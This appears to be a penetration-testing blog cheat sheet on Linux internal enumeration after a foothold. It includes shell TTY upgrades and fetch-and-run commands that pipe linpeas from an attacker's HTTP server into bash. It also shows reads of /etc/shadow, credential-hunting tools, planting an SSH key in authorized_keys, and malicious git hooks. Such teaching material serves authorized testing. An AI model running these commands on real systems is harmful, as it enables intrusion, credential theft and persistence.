---
title: 5. Internal enumeration - Linux
date: 2024-08-02 13:00:00
categories:
  - Pentesting
  - Linux
tags:
  - Pentesting
  - Linux
  - Internal enumeration
toc: true
---

---
Step 5 in a penetration test: Internal enumeration.
Find as much relevant info about the target: networking, services, administration, file system.

---
<!-- more -->

<br>


## Interactive shell
Check python version
```bash
which python
which python3
```

Python bash TTY
```bash
python -c "import pty;pty.spawn('/bin/bash')" 
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Export TTY
```bash
CTRL + Z 
stty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; reset;
```

Adds-on
```bash
export TERM=xterm
stty rows 54 columns 237
alias ll='clear;ls -lsah --color=auto'
```

Another quick, optimized shell
```bash
script -q /dev/null
```

<br>

## Automated enumeration
Download `linpeas`
```bash host a python server
wget https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh -O ~/tools/linpeas.sh
cd ~/tools
chmod +x linpeas.sh
python3 -m http.server 8000
```
```bash run the script without writing to the disk
wget -O - http://10.10.14.10:8000/linpeas.sh | bash
```
```bash save the script and output
wget http://10.10.14.10:8000/linpeas.sh -O /dev/shm/linpeas.sh
bash /dev/shm/linpeas.sh > /dev/shm/linpeas.out
```

<br>

## System info
```bash
# issue, release
cat /etc/issue
cat /etc/*-release

# distribution, version number
cat /etc/os-release

# kernel
uname -a
uname -smr

# arch
file /bin/bash
```
```bash
# system name
hostname

# users
cat /etc/passwd | grep 'sh$'

# environment
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
ls -lsa ~/.Xauthority # display misconfiguration?
```
Open files
```bash
sudo lsof
```
Docker environment
```bash
grep -Ri docker /proc --color=auto 2>/dev/null
ls -lsah /etc | grep -i docker
```
Installed applications
```bash
ls -lsah /usr/bin/
ls -lsah /sbin/
```
Installed packages
```bash
dpkg -l # debian
rpm -qa # RPM
```

<br>

## Filesystem
Files
```bash
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/crontab
cat /etc/update-motd.d 
ls -lsah /etc/passwd
ls -lsah /etc/sudoers 
```
Directories
```bash
ls -lsahR /home/
ls -lsah ~/.ssh/
ls -lsah /var/lib/
ls -lsah /var/db/
ls -lsah /opt/
ls -lsah /tmp/
ls -lsah /var/tmp/
ls -lsah /dev/shm/
ls -lsah /var/mail/
ls -lsah /etc/cron.*
ls -lsah /proc
```
Check for passwords
```bash
ls -lsah /var/apache2
ls -lsah /var/lib/mysql/mysql
```
Files recently created or modified
```bash created or modified in the last 5 days
find / -mtime -5 -o -ctime -5 2>/dev/null
```
Write permissions to files in /etc/ - try to reconfigure services
```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null      # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null     # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null         # Other
find /etc/ -readable -type f 2>/dev/null             # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
```
Mounted files
```bash
mount
df -h
```
Unmounted file-systems
```bash
cat /etc/fstab
```
Writable "message of the day"
```bash
ls -lsah /etc/update-motd.d
```
Files owned by the current user
```bash
find / -type f -user ${whoami} -exec ls {} + 2>/dev/null | grep -v proc
```
Files created or modified in the last 5 days
```bash
find / -mtime -5 -o -ctime -5 2>/dev/null
```
Display configuration with `.Xauthority` and `.xsession` files
```bash
echo $Xauthority
export Xauthority=/home/$(whoami)/.Xauthority
```
Use X11 forwarding to capture the display remotely
```bash
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
convert screen.xwd screen.png
```

<br>

## Services
Processes
```bash
ps
ps aux | grep -i 'root' --color=auto
ps axjf 
ps ef | grep -i root
```
Filter using `grep`
```markdown
-e 	every process
-f 	full format
-l 	long format
-u 	details about user
-j 	jobs
-f 	forest â†’ more visual
```
Scan processes
```bash
wget http://10.10.14.10:8000/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64

wget http://10.10.14.10:8000/pspy32 -O /dev/shm/pspy32
chmod +x /dev/shm/pspy32
/dev/shm/pspy32
```
Cronjobs
```bash
crontab -l
ls -lsah /var/spool/cron
ls -lsah /etc/ | grep cron
ls -lsah /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

<br>

## Network
IP addresses
```bash
ip a s
ifconfig -a
```
Interfaces
```bash
cat /etc/network/interfaces
cat /etc/sysconfig/network
```
DNS server
```bash
cat /etc/resolf.conf
```
Routing table
```bash
netstat -rn 
```
ARP table
```bash
arp -a
route
route -nee
```
Network connections information
```bash
ss
ss -tunlp
sudo netstat
sudo netstat -atunp
sudo netstat -antpx
sudo netstat -tulpn
netstat -tunlp | grep 127.0.0.1  # internal services such as MySQL
```
| -a  | show both listening and non-listening sockets |
| --- | --- |
| -l | show only listening sockets |
| -n | show numeric output instead of resolving the IP address and port number |
| -t | TCP |
| -u | UDP |
| -x | UNIX |
| -p | Show the PID and name of the program to which the socket belongs |


Display internet and network connections
```bash
sudo lsof -i 

# limit to a single port
sudo lsof -i :25
```
List printers
```bash
lpstat -a
```
From dynamic config files
```bash
cat /proc/net/fib_trie # IPv4 addresses
cat /proc/net/tcp      # hex-encoded port data
```
View all TCP connections by non-user accounts
```bash
sudo bpftrace -e 'kprobe:tcp_connect { if (uid < 1000) { @[uid] = count(); } }'
```

<br>

## Users
Logged in users
```bash
who
w
last

whoami
id
```
Files owned by current user
```bash
find / -type f -user ${whoami} -exec ls {} + 2>/dev/null | grep -v proc
```
Authorize our own public key for access
```bash
# locally
ssh-keygen -o
# from local to remote 
scp ~/.ssh/id_rsa.pub remote-user@10.10.10.10:~/.ssh/
# remote
cat ~/.ssh/id_rsa.pub >> authorized_keys 
```

<br>

Script to list users
```bash list_users.sh
#!/bin/bash

echo "System users and last authentication date:"
echo "-----------------------------------------------------"

while IFS=: read -r user _ uid _ _ home shell; do
    if [[ "$shell" =~ sh$ ]]; then
        last_logon=$(last -n 1 -R "$user" | head -n 1 | awk '{print $4, $5, $6}')
        echo "Username: $user"
        echo "UID: $uid"
        echo "Home dir: $home"
        echo "Shell: $shell"
        echo "Last login: $last_logon"
        echo "-----------------------------------------------------"
    fi
done < /etc/passwd
```

<br>

## Credentials
```bash Eviltree
# regex
python3 eviltree.py -r $dir -x ".{0,3}passwd.{0.3}[=]{1}.{0,18}" -A -q -i -v
# keywords
python3 eviltree.py -r $dir -k passw,db_,admin,account,user,token -A -q -i -v
```
```bash Scavanger
sudo python2 ~/tools/scavanger/scavenger.py smb -t $IP -u $username -p '$pass' -d $domain
```

<br>

## Others
Git commits
```bash
git log        # list commits
git log -p     # the patch output
git log -p -2  # last 2 entries
git log --stat # view stats
```
Exploit git hooks
```bash pre-commit hook
echo -e "#!/bin/sh\nmalicious_command" > .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
```
```bash post-checkout hook
echo -e "#!/bin/sh\nmalicious_command" > .git/hooks/post-checkout
chmod +x .git/hooks/post-checkout

```

<br>

---
---
